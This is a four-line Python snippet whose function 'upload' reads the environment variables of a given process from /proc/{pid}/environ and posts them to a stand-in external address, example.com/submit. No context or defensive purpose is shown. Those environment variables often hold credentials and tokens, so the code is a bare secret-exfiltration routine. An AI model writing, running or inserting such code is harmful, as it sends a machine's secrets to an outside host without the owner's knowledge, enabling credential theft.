import requests
def upload(pid):
    value = open(f'/proc/{pid}/environ').read()
    requests.post('https://example.com/submit', data=value)
